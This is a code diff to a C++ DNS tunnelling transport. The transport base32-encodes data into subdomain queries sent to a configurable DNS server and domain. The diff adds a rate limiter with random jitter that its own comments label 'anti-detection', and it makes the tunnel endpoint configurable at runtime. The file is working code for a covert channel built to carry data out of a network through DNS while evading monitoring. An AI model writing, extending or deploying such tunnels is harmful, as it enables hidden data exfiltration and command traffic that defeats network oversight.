@@ -3,33 +3,102 @@
 #include "../../include/federated/transport/udp.h"
 #include <cstring>
 #include <cstdio>
+#include <cstdlib>
+#include <ctime>
 
-// Platform-specific socket includes
+// Platform-specific includes
 #ifdef _WIN32
     #include <winsock2.h>
     #include <ws2tcpip.h>
+    #include <windows.h>
     typedef int socklen_t;
+    
+    // Windows sleep function
+    static void sleep_ms(uint32_t ms) {
+        Sleep(ms);
+    }
+    
+    // Get time in milliseconds
+    static uint64_t get_time_ms() {
+        return GetTickCount64();
+    }
 #else
     #include <sys/socket.h>
     #include <netinet/in.h>
     #include <arpa/inet.h>
     #include <unistd.h>
+    #include <sys/time.h>
     #define INVALID_SOCKET -1
     #define SOCKET_ERROR -1
     typedef int SOCKET;
+    
+    // POSIX sleep function
+    static void sleep_ms(uint32_t ms) {
+        usleep(ms * 1000);
+    }
+    
+    // Get time in milliseconds
+    static uint64_t get_time_ms() {
+        struct timeval tv;
+        gettimeofday(&tv, nullptr);
+        return (uint64_t)tv.tv_sec * 1000 + (uint64_t)tv.tv_usec / 1000;
+    }
 #endif
 
 namespace federated {
 namespace transport {
 
-// DNS Tunnel configuration
-constexpr const char* DNS_SERVER = "8.8.8.8";  // Google Public DNS
-constexpr int DNS_PORT = 53;
-constexpr const char* TUNNEL_DOMAIN = "tunnel.local";
-constexpr size_t MAX_LABEL_LENGTH = 63;
-constexpr size_t MAX_DOMAIN_LENGTH = 253;
-constexpr size_t DNS_HEADER_SIZE = 12;
-constexpr size_t MAX_DNS_MESSAGE = 512;
+// Rate limiter for anti-detection
+struct RateLimiter {
+    uint64_t last_query_time_ms;  // Last query timestamp in milliseconds
+    uint32_t max_qps;              // Maximum queries per second
+    uint32_t min_jitter_ms;        // Minimum jitter delay
+    uint32_t max_jitter_ms;        // Maximum jitter delay
+    bool initialized;
+    
+    RateLimiter() 
+        : last_query_time_ms(0)
+        , max_qps(5)
+        , min_jitter_ms(100)
+        , max_jitter_ms(500)
+        , initialized(false)
+    {}
+    
+    // Check if we should delay before sending next query
+    void enforce_rate_limit() {
+        if (!initialized) {
+            // Initialize random seed on first use
+            srand(static_cast<unsigned int>(time(nullptr)));
+            initialized = true;
+        }
+        
+        uint64_t now = get_time_ms();
+        uint64_t min_interval_ms = 1000 / max_qps;  // Minimum time between queries
+        
+        if (last_query_time_ms > 0) {
+            uint64_t elapsed = now - last_query_time_ms;
+            
+            if (elapsed < min_interval_ms) {
+                // Need to wait to respect rate limit
+                uint32_t wait_time = static_cast<uint32_t>(min_interval_ms - elapsed);
+                sleep_ms(wait_time);
+                now = get_time_ms();
+            }
+        }
+        
+        // Add random jitter for anti-detection
+        uint32_t jitter = min_jitter_ms;
+        if (max_jitter_ms > min_jitter_ms) {
+            jitter += rand() % (max_jitter_ms - min_jitter_ms);
+        }
+        sleep_ms(jitter);
+        
+        last_query_time_ms = get_time_ms();
+    }
+};
+
+// DNS Tunnel configuration (global, can be set before open)
+static DNSTunnelConfig g_config;
 
 // DNS message state
 struct DNSTunnelState {
@@ -37,6 +106,7 @@ struct DNSTunnelState {
     struct sockaddr_in dns_server_addr;
     bool is_open;
     uint16_t transaction_id;
+    RateLimiter rate_limiter;
     
     DNSTunnelState() : socket_fd(INVALID_SOCKET), is_open(false), transaction_id(1) {
         memset(&dns_server_addr, 0, sizeof(dns_server_addr));
@@ -44,6 +114,12 @@ struct DNSTunnelState {
 };
 
 static DNSTunnelState g_dns_tunnel_state;
+
+// DNS protocol constants
+constexpr size_t MAX_LABEL_LENGTH = 63;
+constexpr size_t MAX_DOMAIN_LENGTH = 253;
+constexpr size_t DNS_HEADER_SIZE = 12;
+constexpr size_t MAX_DNS_MESSAGE = 512;
 
 // Base32 encoding table (RFC 4648)
 static const char base32_alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
@@ -199,18 +275,23 @@ static core::ErrorCode dns_tunnel_open() {
     // Configure DNS server address
     memset(&g_dns_tunnel_state.dns_server_addr, 0, sizeof(g_dns_tunnel_state.dns_server_addr));
     g_dns_tunnel_state.dns_server_addr.sin_family = AF_INET;
-    g_dns_tunnel_state.dns_server_addr.sin_port = htons(DNS_PORT);
+    g_dns_tunnel_state.dns_server_addr.sin_port = htons(g_config.dns_port);
     
     // Use inet_addr instead of inet_pton for better compatibility
 #ifdef _WIN32
-    g_dns_tunnel_state.dns_server_addr.sin_addr.s_addr = inet_addr(DNS_SERVER);
+    g_dns_tunnel_state.dns_server_addr.sin_addr.s_addr = inet_addr(g_config.dns_server);
 #else
-    if (inet_pton(AF_INET, DNS_SERVER, &g_dns_tunnel_state.dns_server_addr.sin_addr) <= 0) {
+    if (inet_pton(AF_INET, g_config.dns_server, &g_dns_tunnel_state.dns_server_addr.sin_addr) <= 0) {
         close(g_dns_tunnel_state.socket_fd);
         g_dns_tunnel_state.socket_fd = INVALID_SOCKET;
         return core::ERR_IO;
     }
 #endif
+    
+    // Configure rate limiter
+    g_dns_tunnel_state.rate_limiter.max_qps = g_config.max_qps;
+    g_dns_tunnel_state.rate_limiter.min_jitter_ms = g_config.min_jitter_ms;
+    g_dns_tunnel_state.rate_limiter.max_jitter_ms = g_config.max_jitter_ms;
     
     g_dns_tunnel_state.is_open = true;
     g_dns_tunnel_state.transaction_id = 1;
@@ -246,6 +327,9 @@ static core::ErrorCode dns_tunnel_send(const core::Buffer& data) {
         return core::ERR_FORMAT;
     }
     
+    // Enforce rate limiting with anti-detection jitter
+    g_dns_tunnel_state.rate_limiter.enforce_rate_limit();
+    
     // Encode data to base32
     char encoded[512];
     size_t encoded_len = base32_encode(data.data, data.size, encoded, sizeof(encoded));
@@ -253,9 +337,9 @@ static core::ErrorCode dns_tunnel_send(const core::Buffer& data) {
         return core::ERR_FORMAT;
     }
     
-    // Build domain name: <encoded_data>.<tunnel_domain>
+    // Build domain name: <encoded_data>.<base_domain>
     char domain[MAX_DOMAIN_LENGTH];
-    int written = snprintf(domain, sizeof(domain), "%s.%s", encoded, TUNNEL_DOMAIN);
+    int written = snprintf(domain, sizeof(domain), "%s.%s", encoded, g_config.base_domain);
     if (written < 0 || static_cast<size_t>(written) >= sizeof(domain)) {
         return core::ERR_FORMAT;
     }
@@ -330,6 +414,11 @@ static Transport g_dns_tunnel_transport = {
 
 Transport* DNSTunnelTransport::get_instance() {
     return &g_dns_tunnel_transport;
+}
+
+void DNSTunnelTransport::configure(const DNSTunnelConfig& config) {
+    // Copy configuration (should be called before open())
+    g_config = config;
 }
 
 } // namespace transport
